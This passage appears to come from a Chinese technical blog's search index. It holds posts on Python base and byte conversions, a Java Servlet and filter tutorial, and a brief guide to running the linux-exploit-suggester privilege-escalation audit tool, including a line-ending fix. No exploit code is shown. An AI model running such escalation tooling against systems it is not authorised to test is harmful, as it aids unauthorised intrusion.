class="comment">#&#x27;0xb&#x27;</span></span><br><span class="line"><span class="built_in">hex</span>(<span class="number">15</span>)    <span class="comment">#&#x27;0xf&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="十进制–二进制"><a href="#十进制–二进制" class="headerlink" title="十进制–二进制"></a>十进制–二进制</h2><h3 id="十进制–-gt-二进制"><a href="#十进制–-gt-二进制" class="headerlink" title="十进制–&gt;二进制"></a>十进制–&gt;二进制</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">bin</span>(<span class="number">2</span>)                <span class="comment">#&#x27;0b10&#x27;</span></span><br><span class="line"><span class="built_in">bin</span>(<span class="number">255</span>)              <span class="comment">#&#x27;0b11111111&#x27;</span></span><br><span class="line"><span class="built_in">bin</span>(<span class="number">8</span>)                <span class="comment">#&#x27;0b1000&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="二进制–-gt-十进制"><a href="#二进制–-gt-十进制" class="headerlink" title="二进制–&gt;十进制"></a>二进制–&gt;十进制</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">int</span>(<span class="string">&#x27;0b11111111&#x27;</span>, <span class="number">2</span>)</span><br></pre></td></tr></table></figure><h2 id="十进制–八进制"><a href="#十进制–八进制" class="headerlink" title="十进制–八进制"></a>十进制–八进制</h2><h3 id="十进制–-gt-八进制"><a href="#十进制–-gt-八进制" class="headerlink" title="十进制–&gt;八进制"></a>十进制–&gt;八进制</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">oct</span>(<span class="number">8</span>)                <span class="comment">#&#x27;0o10&#x27;</span></span><br><span class="line"><span class="built_in">oct</span>(<span class="number">7</span>)                <span class="comment">#&#x27;0o7&#x27;</span></span><br><span class="line"><span class="built_in">oct</span>(<span class="number">9</span>)                <span class="comment">#&#x27;0o11&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="八进制–-gt-十进制"><a href="#八进制–-gt-十进制" class="headerlink" title="八进制–&gt;十进制"></a>八进制–&gt;十进制</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">int</span>(<span class="string">&#x27;0o11&#x27;</span>, <span class="number">8</span>)</span><br></pre></td></tr></table></figure><h2 id="字符串转换成整数"><a href="#字符串转换成整数" class="headerlink" title="字符串转换成整数"></a>字符串转换成整数</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#十进制字符串转整数</span></span><br><span class="line">    <span class="built_in">int</span>(<span class="string">&#x27;10&#x27;</span>)             <span class="comment">#10</span></span><br><span class="line">    <span class="built_in">int</span>(<span class="string">&#x27;20&#x27;</span>)             <span class="comment">#20</span></span><br><span class="line">    <span class="comment">#十六进制字符串转整数</span></span><br><span class="line">    <span class="built_in">int</span>(<span class="string">&#x27;f&#x27;</span>,<span class="number">16</span>)           <span class="comment">#15</span></span><br><span class="line">    <span class="built_in">int</span>(<span class="string">&#x27;ff&#x27;</span>,<span class="number">16</span>)          <span class="comment">#255</span></span><br><span class="line">    <span class="built_in">int</span>(<span class="string">&#x27;a&#x27;</span>,<span class="number">16</span>)           <span class="comment">#10</span></span><br><span class="line">    <span class="built_in">int</span>(<span class="string">&#x27;11&#x27;</span>,<span class="number">16</span>)          <span class="comment">#17</span></span><br><span class="line">    <span class="comment">#二进制字符串转整数</span></span><br><span class="line">    <span class="built_in">int</span>(<span class="string">&#x27;1000&#x27;</span>,<span class="number">2</span>)         <span class="comment">#8</span></span><br><span class="line">    <span class="built_in">int</span>(<span class="string">&#x27;1001&#x27;</span>,<span class="number">2</span>)         <span class="comment">#9</span></span><br><span class="line">    <span class="comment">#字节串转整数</span></span><br><span class="line">    <span class="keyword">import</span> struct</span><br><span class="line">    struct.unpack(<span class="string">&#x27;&gt;II&#x27;</span>,<span class="built_in">bytes</span>(<span class="string">b&#x27;\x01\x00\x00\x00\x01\x00\x00\x00&#x27;</span>))             <span class="comment">#(16777216, 16777216)</span></span><br><span class="line">    <span class="comment">#整数转换成字节串</span></span><br><span class="line">    struct.pack(<span class="string">&#x27;&gt;II&#x27;</span>,<span class="number">16777216</span>, <span class="number">16777216</span>)                                       <span class="comment">#b&#x27;\x01\x00\x00\x00\x01\x00\x00\x00&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="字符串转字节串"><a href="#字符串转字节串" class="headerlink" title="字符串转字节串"></a>字符串转字节串</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#字符串编码为字节码</span></span><br><span class="line">    <span class="string">&#x27;123abc&#x27;</span>.encode(<span class="string">&#x27;ascii&#x27;</span>)                  <span class="comment">#b&#x27;123abc&#x27;</span></span><br><span class="line">    <span class="string">&#x27;123abc&#x27;</span>.encode(<span class="string">&#x27;utf-8&#x27;</span>)                  <span class="comment">#b&#x27;123abc&#x27;</span></span><br><span class="line">    <span class="string">&#x27;123abc好&#x27;</span>.encode(<span class="string">&#x27;utf-8&#x27;</span>)                <span class="comment">#b&#x27;123abc\xe5\xa5\xbd&#x27;</span></span><br><span class="line">    <span class="comment">#十六进制字符串转字节串</span></span><br><span class="line">    <span class="built_in">bytes</span>.fromhex(<span class="string">&#x27;ff011a&#x27;</span>)                   <span class="comment">#b&#x27;\xff\x01\x1a&#x27;</span></span><br><span class="line">    <span class="comment">#十六进制字符串转字节串</span></span><br><span class="line">    <span class="built_in">bytes</span>(<span class="built_in">map</span>(<span class="built_in">ord</span>,<span class="string">&#x27;\xff\x01\x1a&#x27;</span>))            <span class="comment">#b&#x27;\xff\x01\x1a&#x27;</span></span><br><span class="line">    <span class="comment">#十六进制数组转字节串</span></span><br><span class="line">    <span class="built_in">bytes</span>([<span class="number">0x01</span>,<span class="number">0x02</span>,<span class="number">0x03</span>,<span class="number">0xff</span>])              <span class="comment">#b&#x27;\x01\x02\x03\xff&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="字节串转字符串"><a href="#字节串转字符串" class="headerlink" title="字节串转字符串"></a>字节串转字符串</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#字节码解码为字符串</span></span><br><span class="line">    <span class="built_in">bytes</span>(<span class="string">b&#x27;123abc\xe5\xa5\xbd&#x27;</span>).decode(<span class="string">&#x27;utf-8&#x27;</span>)         <span class="comment">#&#x27;123abc好&#x27;</span></span><br><span class="line">    <span class="comment">#字节串转16进制表示</span></span><br><span class="line">    <span class="built_in">str</span>(<span class="built_in">bytes</span>(<span class="string">b&#x27;123abc\xe5\xa5\xbd&#x27;</span>))                    <span class="comment">#&quot;b&#x27;123abc\\xe5\\xa5\\xbd&#x27;&quot;</span></span><br><span class="line">    <span class="built_in">str</span>(<span class="built_in">bytes</span>(<span class="string">b&#x27;123abc\xe5\xa5\xbd&#x27;</span>))[<span class="number">2</span>:-<span class="number">1</span>]              <span class="comment">#&#x27;123abc\\xe5\\xa5\\xbd&#x27;</span></span><br><span class="line">    <span class="comment">#字节串转换成16进制数组</span></span><br><span class="line">    [<span class="built_in">hex</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">bytes</span>(<span class="string">b&#x27;123&#x27;</span>)]                      <span class="comment">#[&#x27;0x31&#x27;, &#x27;0x32&#x27;, &#x27;0x33&#x27;]</span></span><br></pre></td></tr></table></figure><h2 id="字符串–二进制串（01形式表示）​"><a href="#字符串–二进制串（01形式表示）​" class="headerlink" title="字符串–二进制串（01形式表示）​"></a>字符串–二进制串（01形式表示）​</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode</span>(<span class="params">s</span>):</span></span><br><span class="line"><span class="keyword">return</span> <span class="string">&#x27; &#x27;</span>.join([<span class="built_in">bin</span>(<span class="built_in">ord</span>(c)).replace(<span class="string">&#x27;0b&#x27;</span>, <span class="string">&#x27;&#x27;</span>) <span class="keyword">for</span> c <span class="keyword">in</span> s])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> [<span class="built_in">int</span>(b, <span class="number">2</span>) <span class="keyword">for</span> b <span class="keyword">in</span> s.split(<span class="string">&#x27; &#x27;</span>)]]) </span><br><span class="line">encode(<span class="string">&#x27;hello&#x27;</span>)</span><br><span class="line"><span class="comment"># &#x27;1101000 1100101 1101100 1101100 1101111&#x27;</span></span><br><span class="line">decode(<span class="string">&#x27;1101000 1100101 1101100 1101100 1101111&#x27;</span>)</span><br><span class="line"><span class="comment"># &#x27;hello&#x27;</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span> &gt;&gt;&gt; <span class="built_in">bin</span>(<span class="built_in">int</span>(<span class="string">&#x27;256&#x27;</span>, <span class="number">10</span>))</span><br><span class="line"><span class="number">2.</span> <span class="string">&#x27;0b100000000&#x27;</span></span><br><span class="line"><span class="number">3.</span> &gt;&gt;&gt; <span class="built_in">str</span>(<span class="built_in">int</span>(<span class="string">&#x27;0b100000000&#x27;</span>, <span class="number">2</span>))</span><br><span class="line"><span class="number">4.</span> <span class="string">&#x27;256&#x27;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Servlet</title>
      <link href="/p/1401e6d1.html"/>
      <url>/p/1401e6d1.html</url>
      
        <content type="html"><![CDATA[<p>开始卷java了，先写一下在IDEA部署Servlet的两种方法吧，一种导包，一种用maven，然后记录自己学习的过程吧。</p><h1 id="IDEA部署Servlet"><a href="#IDEA部署Servlet" class="headerlink" title="IDEA部署Servlet"></a>IDEA部署Servlet</h1><h2 id="导servlet-api-jar包部署"><a href="#导servlet-api-jar包部署" class="headerlink" title="导servlet-api.jar包部署"></a>导<code>servlet-api.jar</code>包部署</h2><h3 id="新建java项目"><a href="#新建java项目" class="headerlink" title="新建java项目"></a>新建java项目</h3><p>添加框架支持：</p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211223153750446.png" alt="image-20211223153750446"></p><h3 id="添加web框架"><a href="#添加web框架" class="headerlink" title="添加web框架"></a>添加web框架</h3><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211223154035652.png" alt="image-20211223154035652"></p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211223154201963.png" alt="image-20211223154201963"></p><h3 id="项目目录架构"><a href="#项目目录架构" class="headerlink" title="项目目录架构"></a>项目目录架构</h3><table><thead><tr><th>目录</th><th>描述</th></tr></thead><tbody><tr><td>.idea</td><td>IDEA工程配置文件</td></tr><tr><td>src</td><td>存放Java代码</td></tr><tr><td>web</td><td>存放项目资源</td></tr><tr><td>WEB-INF</td><td>存放项目配置文件，Jar包、class文件</td></tr><tr><td>WebProject.iml</td><td>模块配置文件</td></tr><tr><td>External Libraries</td><td>外部Jar文件</td></tr></tbody></table><h3 id="手工导入servlet-api-jar文件"><a href="#手工导入servlet-api-jar文件" class="headerlink" title="手工导入servlet-api.jar文件"></a>手工导入servlet-api.jar文件</h3><p>在<code>WEB-INF</code>文件夹下新建<code>lib</code>文件夹将<code>tomcat</code>中的<code>servlet-api.jar</code>复制进去</p><p>然后对文件进行项目集成，右键<code>lib</code></p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211223160110646.png" alt="image-20211223160110646"></p><h3 id="编写Servlet"><a href="#编写Servlet" class="headerlink" title="编写Servlet"></a>编写Servlet</h3><p>创建<code>MyServlet</code>，实现<code>Servlet</code>接口，重写5个方法</p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211223160459145.png" alt="image-20211223160459145"></p><h3 id="配置web-xml文件"><a href="#配置web-xml文件" class="headerlink" title="配置web.xml文件"></a>配置<code>web.xml</code>文件</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">web-app</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_3_1.xsd&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">version</span>=<span class="string">&quot;3.1&quot;</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>MyServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>com.dropann.servlet.MyServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>MyServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/myservlet<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="集成tomcat"><a href="#集成tomcat" class="headerlink" title="集成tomcat"></a>集成tomcat</h3><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211223105023496.png" alt="image-20211223105023496"></p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211223162321031.png" alt="image-20211223162321031"></p><h3 id="关联第三方jar包"><a href="#关联第三方jar包" class="headerlink" title="关联第三方jar包"></a>关联第三方jar包</h3><p>基本同手工导入<code>servlet-api.jar</code>文件</p><p>选择<code>Project Library</code>完成</p><p><code>Global Library</code> 表示所有工程都可以使用</p><p><code>Project Library</code>表示当前工程中所有的模块都可使用</p><p><code>Module Library</code>表示当前模块可以使用</p><h3 id="导出war包"><a href="#导出war包" class="headerlink" title="导出war包"></a>导出war包</h3><p>war包可以直接放入Tomcat的<code>webapps</code>目录中，启动Tomcat后自动解压</p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211223163451480.png" alt="image-20211223163451480"></p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211223163808890.png" alt="image-20211223163808890"></p><p>构建war包</p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211223164317420.png" alt="image-20211223164317420"></p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211223164321773.png" alt="image-20211223164321773"></p><blockquote><p>在<code>out\artifacts</code>目录中，查看生产的war包</p></blockquote><h3 id="解决IDEA打印中文乱码"><a href="#解决IDEA打印中文乱码" class="headerlink" title="解决IDEA打印中文乱码"></a>解决IDEA打印中文乱码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-Dfile.encoding=UTF-8</span><br></pre></td></tr></table></figure><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211224230734905.png" alt="image-20211224230734905"></p><h2 id="maven部署"><a href="#maven部署" class="headerlink" title="maven部署"></a>maven部署</h2><p>留坑</p><h1 id="Servlet-核心接口和类"><a href="#Servlet-核心接口和类" class="headerlink" title="Servlet 核心接口和类"></a>Servlet 核心接口和类</h1><h2 id="Servlet接口"><a href="#Servlet接口" class="headerlink" title="Servlet接口"></a>Servlet接口</h2><p>所有Servlet都会直接间接与该接口发生联系，该接口包括以下5种方法:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">init(ServletConfig servletConfig)</span><br><span class="line"></span><br><span class="line"><span class="function">ServletConfig <span class="title">getServletConfig</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">service</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">getServletInfo</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">destroy</span><span class="params">()</span></span></span><br></pre></td></tr></table></figure><blockquote><p><code>init()</code>Servlet实例化后，Servlet容器会调用<code>init()</code>方法来初始化该对象，在处理客户请求前完成初始化操作，如建立数据库连接等。</p></blockquote><h2 id="GenericServlet抽象类"><a href="#GenericServlet抽象类" class="headerlink" title="GenericServlet抽象类"></a>GenericServlet抽象类</h2><p>它提供生命周期<code>init</code>和<code>destroy</code>的简单实现，要编写Servlet只需要重写抽象<code>service</code></p><h2 id="HttpServlet类"><a href="#HttpServlet类" class="headerlink" title="HttpServlet类"></a>HttpServlet类</h2><p>该类继承<code>GenericServlet</code>的基础上进一步扩展。HttpServlet的子类必须重写一个方法，该方法通常是以下方法之一：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">doGet</span><br><span class="line">doPost</span><br><span class="line">doPut</span><br><span class="line">doDelete</span><br></pre></td></tr></table></figure><h2 id="Web-xml配置"><a href="#Web-xml配置" class="headerlink" title="Web.xml配置"></a>Web.xml配置</h2><p>精确匹配  <code>/具体名称</code></p><p>后缀匹配 <code>*.xxx</code></p><p>通配符匹配1<code>/*</code>    包含服务器所有的资源</p><p>通配符匹配2<code>/</code>     包含服务器所有的资源，不包括jsp</p><h2 id="WebServlet注解常用属性"><a href="#WebServlet注解常用属性" class="headerlink" title="@WebServlet注解常用属性"></a>@WebServlet注解常用属性</h2><p><code>name</code>：Serlvet名字(可选)</p><p><code>value</code>：配置url路径，可配置多个</p><p><code>urlPatterns</code>：配置url路径，和value作用一样，不能同时使用</p><p><code>loadOnStartup</code>：配置Servlet的创建的时机，如果是<strong>0</strong>或<strong>正数</strong> 启动程序时创建，如果是<strong>负数</strong>，则访问时创建。数字越小优先级越高。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@WebServlet(value = &#123;&quot;/bs&quot;,&quot;/bss&quot;&#125;, loadOnStartup = 0)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BasicServlet</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;这是get方法&quot;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h1 id="Servlet应用"><a href="#Servlet应用" class="headerlink" title="Servlet应用"></a>Servlet应用</h1><p>在Servlet中用来处理客户端请求需要用<code>doGet</code>或<code>doPost</code>方法的request对象</p><p>解决<code>doPost</code>出现乱码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">req.setCharacterEncoding(<span class="string">&quot;utf-8&quot;</span>);</span><br></pre></td></tr></table></figure><p>解决响应出现乱码</p><p>同时设置服务端的编码格式和客户端响应的文件类型以及响应时的编码格式</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">resp.setContentType(<span class="string">&quot;text/html;charset=UTF-8&quot;</span>);</span><br></pre></td></tr></table></figure><blockquote><p>在<code>getWriter()</code>前设置</p></blockquote><h2 id="Servlet生命周期"><a href="#Servlet生命周期" class="headerlink" title="Servlet生命周期"></a>Servlet生命周期</h2><p>1.<strong>实例化</strong>：由容器调用Servlet构造器创建具体的Servlet对象，只执行一次。</p><p>2.<strong>初始化</strong>：调用<code>init()</code>方法会被调用，只执行一次。</p><p>3.<strong>提供服务</strong>：调用服务器的<code>Servlet()</code>方法处理请求，会执行多次。</p><p>4.<strong>销毁</strong>：当容器停止或重新启动都会引起销毁Servlet对象并调用destroy方法，释放所有在<code>init()</code>中申请的资源，只执行一次。</p><h1 id="filter过滤器"><a href="#filter过滤器" class="headerlink" title="filter过滤器"></a>filter过滤器</h1><p>过滤器时处于客户端与服务器目标资源之间的一道过滤技术。</p><h2 id="过滤器作用："><a href="#过滤器作用：" class="headerlink" title="过滤器作用："></a>过滤器作用：</h2><p>客户端发送请求时，会先经过Filter在到达目标Servlet中；响应时，会根据执行流程再次反向执行Filter。</p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211226232239366.png" alt="image-20211226232239366"></p><h2 id="编写过滤器"><a href="#编写过滤器" class="headerlink" title="编写过滤器"></a>编写过滤器</h2><p>ServletAPI中提供了一个接口，开发人员编写一个Java类实现接口，这个类称之为过滤器。</p><h3 id="实现过程"><a href="#实现过程" class="headerlink" title="实现过程"></a>实现过程</h3><ol><li>编写Java类实现Filter接口</li><li>在doFilter方法中编写拦截逻辑</li><li>设置拦截路径</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyFilter</span> <span class="keyword">implements</span> <span class="title">Filter</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;--My--Filter&quot;</span>);</span><br><span class="line">        <span class="comment">//让请求继续</span></span><br><span class="line">        filterChain.doFilter(servletRequest,servletResponse);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">destroy</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="过滤器配置"><a href="#过滤器配置" class="headerlink" title="过滤器配置"></a>过滤器配置</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@WebFilter(value = &quot;/过滤目标资源&quot;)</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>提权审计</title>
      <link href="/p/f775d65e.html"/>
      <url>/p/f775d65e.html</url>
      
        <content type="html"><![CDATA[<p>总结系统提权审计工具</p><h1 id="linux-exploit-suggester"><a href="#linux-exploit-suggester" class="headerlink" title="linux-exploit-suggester"></a>linux-exploit-suggester</h1><p><code>linux-exploit-suggester</code>是一个提权审计工具</p><p><a href="https://github.com/mzet-/linux-exploit-suggester">https://github.com/mzet-/linux-exploit-suggester</a></p><h2 id="解决-bad-interpreter报错"><a href="#解决-bad-interpreter报错" class="headerlink" title="解决: bad interpreter报错"></a>解决: bad interpreter报错</h2><p>报错原因：脚本从windows到linux有点水土不服，必须将脚本格式由dos改为unix才能解决问题。</p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211211173859852.png" alt="image-20211211173859852"></p><p><code>vim</code>看到脚本是dos格式，<code>:set ff</code>也可以查看脚本格式</p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211211175543869.png" alt="image-20211211175543869"></p><p>在命令模式设置<code>:set ff=unix</code>将格式修改为unix格式，再输入<code>:set ff</code>返回如下结果表示修改成功。</p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211211180006346.png" alt="image-20211211180006346"></p><h3 id="使用kali中dos2unix命令"><a href="#使用kali中dos2unix命令" class="headerlink" title="使用kali中dos2unix命令"></a>使用kali中<code>dos2unix</code>命令</h3><p><code>dos2unix</code>命令用来将DOS格式的文本文件转换成UNIX格式的（DOS/MAC to UNIX text file format converter）。DOS下的文本文件是以<code>\r\n</code>作为断行标志的，表示成十六进制就是<code>0D 0A</code>。而Unix下的文本文件是以<code>\n</code>作为断行标志的，表示成十六进制就是<code>0A</code>。DOS格式的文本文件在Linux底下，用较低版本的vi打开时行尾会显示<code>^M</code>，而且很多命令都无法很好的处理这种格式的文件，如果是个shell脚本，。而Unix格式的文本文件在Windows下用Notepad打开时会拼在一起显示。因此产生了两种格式文件相互转换的需求，对应的将UNIX格式文本文件转成成DOS格式的是unix2dos命令。</p><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211211180408667.png" alt="image-20211211180408667"></p><p>添加权限&amp;执行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod +x les.sh</span><br><span class="line">./les.sh</span><br></pre></td></tr></table></figure><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211211182017833.png" alt="image-20211211182017833"></p>]]></content>
      
      
      <categories>
          
          <category> 安全工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 提权 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux提权</title>
      <link href="/p/3e45f69d.html"/>
      <url>/p/3e45f69d.html</url>
      
